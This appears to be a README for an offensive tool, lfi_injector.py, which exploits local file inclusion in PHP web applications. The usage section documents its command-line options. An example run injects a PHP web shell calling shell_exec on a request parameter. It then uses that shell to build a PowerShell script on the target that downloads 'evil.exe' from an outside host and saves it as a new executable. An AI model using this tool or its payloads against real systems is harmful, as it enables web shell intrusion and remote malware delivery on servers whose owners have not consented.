# lfi_injector

## Usage

```
usage: lfi_injector.py [-h] -f FILE -u URL -p PARAMETER [-v] {inject} ...

positional arguments:
  {inject}              inject -h for details

optional arguments:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  file with code to send
  -u URL, --url URL     full vulnerable url (minus injected parameter
  -p PARAMETER, --parameter PARAMETER
                        injected parameter (ex: cmd)
  -v, --verbose         v: increased detail; vv: even more detail
  ```
  
  ### inject
  
  ```
  usage: lfi_injector.py inject [-h] [--port PORT] target

positional arguments:
  target       target to inject parser

optional arguments:
  -h, --help   show this help message and exit
  --port PORT  port to inject (default: 80)
  ```
  
  ## Example
  
  ```
python .\lfi_injector.py -f testfile -u http://127.0.0.1:8997?name=shrek -p t3st -v inject 127.0.0.1 --port=8997
[+] inject php parameter parser enabled
[+] connecting to 127.0.0.1 on port 8997
[+] injecting: <?php echo shell_exec($_GET['t3st']);?>
[+] url: http://127.0.0.1:8997?name=shrek, parameter: t3st
[+] code read from file: testfile
[+] sending requests...
[+] sending: http://127.0.0.1:8997?name=shrek&t3st=echo+%24storageDir+%3D+%24pwd+%3E+wget.ps1
[+] success!
[+] sending: http://127.0.0.1:8997?name=shrek&t3st=echo+%24webclient+%3D+New-Object+System.Net.WebClient+%3E%3Ewget.ps1
[+] success!
[+] sending: http://127.0.0.1:8997?name=shrek&t3st=echo+%24url+%3D+%22http%3A%2F%2F10.11.0.5%2Fevil.exe%22+%3E%3Ewget.ps1
[+] success!
[+] sending: http://127.0.0.1:8997?name=shrek&t3st=echo+%24file+%3D+%22new-exploit.exe%22+%3E%3Ewget.ps1
[+] success!
[+] sending: http://127.0.0.1:8997?name=shrek&t3st=echo+%24webclient.DownloadFile%28%24url%2C%24file%29+%3E%3Ewget.ps1
[+] success!
[+] 100% successful transfer!
```

# TODO

Definitely still needs a little work, but wanted to gice a placeholder for now...
